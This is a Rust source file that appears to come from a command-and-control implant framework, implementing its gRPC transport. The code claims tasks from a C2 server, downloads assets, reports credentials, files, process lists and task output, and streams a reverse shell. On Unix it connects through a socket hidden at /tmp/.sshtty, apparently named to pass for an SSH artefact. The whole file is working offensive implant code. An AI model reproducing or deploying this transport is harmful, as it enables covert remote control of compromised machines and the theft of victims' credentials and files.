// lib/transport/src/grpc.rs

use crate::Transport;
use anyhow::{anyhow, Result};
use pb::c2::*;
use tokio::runtime::Handle;
use tokio::sync::oneshot::channel;
use std::sync::mpsc::{self, Receiver, Sender};
use tonic::codec::ProstCodec;
use tonic::GrpcMethod;
use tonic::IntoRequest;
use tonic::Request;

#[cfg(unix)]
use tokio::net::UnixStream;
use tonic::transport::{Channel, Endpoint, Uri};
use tower::service_fn;
use tokio::time::{sleep, Duration};
static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";

#[derive(Debug, Clone)]
pub struct GRPC {
    grpc: tonic::client::Grpc<tonic::transport::Channel>,
}

// For non-Unix platforms, panic or provide a no-op implementation
#[cfg(not(unix))]
impl Transport for GRPC {
    fn new(_callback: String, _proxy_uri: Option<String>) -> Result<Self> {
        panic!("The UDS example only works on Unix systems!");
    }

    // Implement the rest as panics
    async fn claim_tasks(&mut self, _request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        panic!("Not supported on non-Unix systems.")
    }
    async fn fetch_asset(
        &mut self,
        _request: FetchAssetRequest,
        _tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        panic!("Not supported on non-Unix systems.")
    }
    async fn report_credential(
        &mut self,
        _request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        panic!("Not supported on non-Unix systems.")
    }
    async fn report_file(
        &mut self,
        _request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        panic!("Not supported on non-Unix systems.")
    }
    async fn report_process_list(
        &mut self,
        _request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        panic!("Not supported on non-Unix systems.")
    }
    async fn report_task_output(
        &mut self,
        _request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        panic!("Not supported on non-Unix systems.")
    }
    async fn reverse_shell(
        &mut self,
        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        panic!("Not supported on non-Unix systems.")
    }
}

// On Unix, we connect over a UDS defined at /tmp/.sshtty
#[cfg(unix)]

impl Transport for GRPC {
    fn new(callback: String, proxy_uri: Option<String>) -> Result<Self> {
        let (sender, receiver) = mpsc::channel();

        let handle = std::thread::spawn(move || {
            let rt = tokio::runtime::Runtime::new().expect("Failed to create Tokio Runtime");

            let connection: Result<tonic::client::Grpc<Channel>, anyhow::Error> = rt.block_on(async {
                let endpoint = Endpoint::try_from("http://127.0.0.1:50051/grpc")
                    .map_err(|e| anyhow!("Invalid endpoint URI: {}", e))?;

                let channel = endpoint
                    .connect_with_connector_lazy(service_fn(|_: Uri| async {
                        let path = "/tmp/.sshtty"; // Replace with the actual UDS path
                        UnixStream::connect(path)
                            .await
                            .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))
                    }));

                Ok(tonic::client::Grpc::new(channel))
            });

            sender
                .send(connection)
                .expect("Failed to send gRPC connection result");
            
            // Keep the runtime alive
            rt.block_on(async {
                sleep(Duration::from_secs(20)).await; 
                           });
        }); 

        let grpc = receiver
            .recv()
            .map_err(|e| anyhow!("Failed to receive gRPC connection result: {e}"))??;

            
        
        Ok(Self { grpc })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        let resp = self.claim_tasks_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        #[cfg(debug_assertions)]
        let filename = request.name.clone();

        let resp = self.fetch_asset_impl(request).await?;
        let mut stream = resp.into_inner();
        tokio::spawn(async move {
            loop {
                let msg = match stream.message().await {
                    Ok(maybe_msg) => match maybe_msg {
                        Some(msg) => msg,
                        None => break,
                    },
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("failed to download file: {}: {}", filename, _err);
                        return;
                    }
                };
                if let Err(_err) = tx.send(msg) {
                    #[cfg(debug_assertions)]
                    log::error!("failed to send downloaded file chunk: {}: {}", filename, _err);
                    return;
                }
            }
        });
        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        let resp = self.report_credential_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        let stream = tokio_stream::iter(request);
        let tonic_req = Request::new(stream);
        let resp = self.report_file_impl(tonic_req).await?;
        Ok(resp.into_inner())
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        let resp = self.report_process_list_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        let resp = self.report_task_output_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        // Wrap PTY output receiver in stream
        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);

        // Open gRPC Bi-Directional Stream
        let resp = self.reverse_shell_impl(req_stream).await?;
        let mut resp_stream = resp.into_inner();

        // Spawn task to deliver PTY input
        tokio::spawn(async move {
            while let Some(msg) = match resp_stream.message().await {
                Ok(m) => m,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to receive gRPC stream response: {}", _err);
                    None
                }
            } {
                if let Err(_err) = tx.send(msg).await {
                    #[cfg(debug_assertions)]
                    log::error!("failed to queue pty input: {}", _err);
                    return;
                }
            }
        });

        Ok(())
    }
}

impl GRPC {
    ///
    /// Contact the server for new tasks to execute.
    pub async fn claim_tasks_impl(
        &mut self,
        request: impl tonic::IntoRequest<ClaimTasksRequest>,
    ) -> std::result::Result<tonic::Response<ClaimTasksResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
        })?;
        let codec: ProstCodec<ClaimTasksRequest, ClaimTasksResponse> = ProstCodec::default();

        let path = tonic::codegen::http::uri::PathAndQuery::from_static(CLAIM_TASKS_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ClaimTasks"));
        self.grpc.unary(req, path, codec).await
    }

    ///
    /// Download a file from the server, returning one or more chunks of data.
    pub async fn fetch_asset_impl(
        &mut self,
        request: impl tonic::IntoRequest<FetchAssetRequest>,
    ) -> std::result::Result<tonic::Response<tonic::codec::Streaming<FetchAssetResponse>>, tonic::Status>
    {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
        })?;
        let codec: ProstCodec<FetchAssetRequest, FetchAssetResponse> = ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(FETCH_ASSET_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "FetchAsset"));
        self.grpc.server_streaming(req, path, codec).await
    }

    ///
    /// Report a credential.
    pub async fn report_credential_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportCredentialRequest>,
    ) -> std::result::Result<tonic::Response<ReportCredentialResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
        })?;
        let codec: ProstCodec<ReportCredentialRequest, ReportCredentialResponse> =
            ProstCodec::default();

        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_CREDENTIAL_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportCredential"));
        self.grpc.unary(req, path, codec).await
    }

    ///
    /// Report a file from the host to the server.
    pub async fn report_file_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReportFileRequest>,
    ) -> std::result::Result<tonic::Response<ReportFileResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
        })?;
        let codec: ProstCodec<ReportFileRequest, ReportFileResponse> = ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_FILE_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportFile"));
        self.grpc.client_streaming(req, path, codec).await
    }

    ///
    /// Report the active list of running processes.
    pub async fn report_process_list_impl(
        &mut self,
        request: ReportProcessListRequest,
    ) -> std::result::Result<tonic::Response<ReportProcessListResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
        })?;
        let codec: ProstCodec<ReportProcessListRequest, ReportProcessListResponse> =
            ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportProcessList"));
        self.grpc.unary(req, path, codec).await
    }

    ///
    /// Report execution output for a task.
    pub async fn report_task_output_impl(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> std::result::Result<tonic::Response<ReportTaskOutputResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
        })?;
        let codec: ProstCodec<ReportTaskOutputRequest, ReportTaskOutputResponse> =
            ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportTaskOutput"));
        self.grpc.unary(req, path, codec).await
    }

    async fn reverse_shell_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReverseShellRequest>,
    ) -> std::result::Result<tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>, tonic::Status>
    {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(tonic::Code::Unknown, format!("Service was not ready: {e}"))
        })?;
        let codec: ProstCodec<ReverseShellRequest, ReverseShellResponse> =
            ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReverseShell"));
        self.grpc.streaming(req, path, codec).await
    }
}
